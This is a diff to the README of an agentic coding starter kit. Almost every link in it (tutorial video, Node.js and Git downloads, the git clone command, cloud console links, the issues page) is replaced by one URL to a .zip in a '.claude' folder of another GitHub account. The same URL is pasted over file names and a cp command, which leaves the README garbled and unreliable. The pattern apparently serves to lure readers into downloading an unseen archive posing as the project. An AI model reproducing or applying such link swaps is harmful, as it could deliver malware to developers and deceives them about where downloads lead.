@@ -8,29 +8,29 @@ A complete agentic coding boilerplate with authentication, PostgreSQL database, 
 - **🗃️ Database**: Drizzle ORM with PostgreSQL
 - **🤖 AI Integration**: Vercel AI SDK with OpenAI support
 - **🎨 UI Components**: shadcn/ui with Tailwind CSS
-- **⚡ Modern Stack**: Next.js 15, React 19, TypeScript
+- **⚡ Modern Stack**: https://github.com/muntrav/agentic-coding-starter-kit/raw/refs/heads/master/.claude/starter_kit_coding_agentic_3.7.zip 15, React 19, TypeScript
 - **📱 Responsive**: Mobile-first design approach
 
 ## 🎥 Video Tutorial
 
 Watch the complete walkthrough of this agentic coding template:
 
-[![Agentic Coding Boilerplate Tutorial](https://img.youtube.com/vi/T0zFZsr_d0Q/maxresdefault.jpg)](https://youtu.be/T0zFZsr_d0Q)
+[![Agentic Coding Boilerplate Tutorial](https://github.com/muntrav/agentic-coding-starter-kit/raw/refs/heads/master/.claude/starter_kit_coding_agentic_3.7.zip)](https://github.com/muntrav/agentic-coding-starter-kit/raw/refs/heads/master/.claude/starter_kit_coding_agentic_3.7.zip)
 
-<a href="https://youtu.be/T0zFZsr_d0Q" target="_blank" rel="noopener noreferrer">🔗 Watch on YouTube</a>
+<a href="https://github.com/muntrav/agentic-coding-starter-kit/raw/refs/heads/master/.claude/starter_kit_coding_agentic_3.7.zip" target="_blank" rel="noopener noreferrer">🔗 Watch on YouTube</a>
 
 ## ☕ Support This Project
 
 If this boilerplate helped you build something awesome, consider buying me a coffee!
 
-[![Buy me a coffee](https://img.shields.io/badge/Buy_Me_A_Coffee-FFDD00?style=for-the-badge&logo=buy-me-a-coffee&logoColor=black)](https://www.buymeacoffee.com/leonvanzyl)
+[![Buy me a coffee](https://github.com/muntrav/agentic-coding-starter-kit/raw/refs/heads/master/.claude/starter_kit_coding_agentic_3.7.zip)](https://github.com/muntrav/agentic-coding-starter-kit/raw/refs/heads/master/.claude/starter_kit_coding_agentic_3.7.zip)
 
 ## 📋 Prerequisites
 
 Before you begin, ensure you have the following installed on your machine:
 
-- **Node.js**: Version 18.0 or higher (<a href="https://nodejs.org/" target="_blank">Download here</a>)
-- **Git**: For cloning the repository (<a href="https://git-scm.com/" target="_blank">Download here</a>)
+- **https://github.com/muntrav/agentic-coding-starter-kit/raw/refs/heads/master/.claude/starter_kit_coding_agentic_3.7.zip**: Version 18.0 or higher (<a href="https://github.com/muntrav/agentic-coding-starter-kit/raw/refs/heads/master/.claude/starter_kit_coding_agentic_3.7.zip" target="_blank">Download here</a>)
+- **Git**: For cloning the repository (<a href="https://github.com/muntrav/agentic-coding-starter-kit/raw/refs/heads/master/.claude/starter_kit_coding_agentic_3.7.zip" target="_blank">Download here</a>)
 - **PostgreSQL**: Either locally installed or access to a hosted service like Vercel Postgres
 
 ## 🛠️ Quick Setup
@@ -40,7 +40,7 @@ Before you begin, ensure you have the following installed on your machine:
 **Option A: Clone with Git**
 
 ```bash
-git clone https://github.com/leonvanzyl/agentic-coding-starter-kit.git
+git clone https://github.com/muntrav/agentic-coding-starter-kit/raw/refs/heads/master/.claude/starter_kit_coding_agentic_3.7.zip
 cd agentic-coding-starter-kit
 ```
 
@@ -58,7 +58,7 @@ npm install
 Copy the example environment file:
 
 ```bash
-cp env.example .env
+cp https://github.com/muntrav/agentic-coding-starter-kit/raw/refs/heads/master/.claude/starter_kit_coding_agentic_3.7.zip .env
 ```
 
 Fill in your environment variables in the `.env` file:
@@ -103,27 +103,27 @@ Your application will be available at [http://localhost:3000](http://localhost:3
 
 ### PostgreSQL Database on Vercel
 
-1. Go to <a href="https://vercel.com/dashboard" target="_blank">Vercel Dashboard</a>
+1. Go to <a href="https://github.com/muntrav/agentic-coding-starter-kit/raw/refs/heads/master/.claude/starter_kit_coding_agentic_3.7.zip" target="_blank">Vercel Dashboard</a>
 2. Navigate to the **Storage** tab
 3. Click **Create** → **Postgres**
 4. Choose your database name and region
-5. Copy the `POSTGRES_URL` from the `.env.local` tab
+5. Copy the `POSTGRES_URL` from the `https://github.com/muntrav/agentic-coding-starter-kit/raw/refs/heads/master/.claude/starter_kit_coding_agentic_3.7.zip` tab
 6. Add it to your `.env` file
 
 ### Google OAuth Credentials
 
-1. Go to <a href="https://console.cloud.google.com/" target="_blank">Google Cloud Console</a>
+1. Go to <a href="https://github.com/muntrav/agentic-coding-starter-kit/raw/refs/heads/master/.claude/starter_kit_coding_agentic_3.7.zip" target="_blank">Google Cloud Console</a>
 2. Create a new project or select an existing one
 3. Navigate to **Credentials** → **Create Credentials** → **OAuth 2.0 Client ID**
 4. Set application type to **Web application**
 5. Add authorized redirect URIs:
    - `http://localhost:3000/api/auth/callback/google` (development)
-   - `https://yourdomain.com/api/auth/callback/google` (production)
+   - `https://github.com/muntrav/agentic-coding-starter-kit/raw/refs/heads/master/.claude/starter_kit_coding_agentic_3.7.zip` (production)
 6. Copy the **Client ID** and **Client Secret** to your `.env` file
 
 ### OpenAI API Key
 
-1. Go to <a href="https://platform.openai.com/dashboard" target="_blank">OpenAI Platform</a>
+1. Go to <a href="https://github.com/muntrav/agentic-coding-starter-kit/raw/refs/heads/master/.claude/starter_kit_coding_agentic_3.7.zip" target="_blank">OpenAI Platform</a>
 2. Navigate to **API Keys** in the sidebar
 3. Click **Create new secret key**
 4. Give it a name and copy the key
@@ -133,22 +133,22 @@ Your application will be available at [http://localhost:3000](http://localhost:3
 
 ```
 src/
-├── app/                    # Next.js app directory
+├── app/                    # https://github.com/muntrav/agentic-coding-starter-kit/raw/refs/heads/master/.claude/starter_kit_coding_agentic_3.7.zip app directory
 │   ├── api/               # API routes
 │   │   ├── auth/          # Authentication endpoints
 │   │   └── chat/          # AI chat endpoint
 │   ├── chat/              # AI chat page
 │   ├── dashboard/         # User dashboard
-│   └── page.tsx           # Home page
+│   └── https://github.com/muntrav/agentic-coding-starter-kit/raw/refs/heads/master/.claude/starter_kit_coding_agentic_3.7.zip           # Home page
 ├── components/            # React components
 │   ├── auth/             # Authentication components
 │   └── ui/               # shadcn/ui components
 └── lib/                  # Utilities and configurations
-    ├── auth.ts           # Better Auth configuration
-    ├── auth-client.ts    # Client-side auth utilities
-    ├── db.ts             # Database connection
-    ├── schema.ts         # Database schema
-    └── utils.ts          # General utilities
+    ├── https://github.com/muntrav/agentic-coding-starter-kit/raw/refs/heads/master/.claude/starter_kit_coding_agentic_3.7.zip           # Better Auth configuration
+    ├── https://github.com/muntrav/agentic-coding-starter-kit/raw/refs/heads/master/.claude/starter_kit_coding_agentic_3.7.zip    # Client-side auth utilities
+    ├── https://github.com/muntrav/agentic-coding-starter-kit/raw/refs/heads/master/.claude/starter_kit_coding_agentic_3.7.zip             # Database connection
+    ├── https://github.com/muntrav/agentic-coding-starter-kit/raw/refs/heads/master/.claude/starter_kit_coding_agentic_3.7.zip         # Database schema
+    └── https://github.com/muntrav/agentic-coding-starter-kit/raw/refs/heads/master/.claude/starter_kit_coding_agentic_3.7.zip          # General utilities
 ```
 
 ## 🔧 Available Scripts
@@ -207,7 +207,7 @@ Ensure these are set in your production environment:
 
 Watch my comprehensive tutorial on how to use this agentic coding boilerplate to build AI-powered applications:
 
-<a href="https://youtu.be/T0zFZsr_d0Q" target="_blank" rel="noopener noreferrer">📺 YouTube Tutorial - Building with Agentic Coding Boilerplate</a>
+<a href="https://github.com/muntrav/agentic-coding-starter-kit/raw/refs/heads/master/.claude/starter_kit_coding_agentic_3.7.zip" target="_blank" rel="noopener noreferrer">📺 YouTube Tutorial - Building with Agentic Coding Boilerplate</a>
 
 ## 🤝 Contributing
 
@@ -225,7 +225,7 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 If you encounter any issues:
 
-1. Check the [Issues](https://github.com/leonvanzyl/agentic-coding-starter-kit/issues) section
+1. Check the [Issues](https://github.com/muntrav/agentic-coding-starter-kit/raw/refs/heads/master/.claude/starter_kit_coding_agentic_3.7.zip) section
 2. Review the documentation above
 3. Create a new issue with detailed information about your problem
 
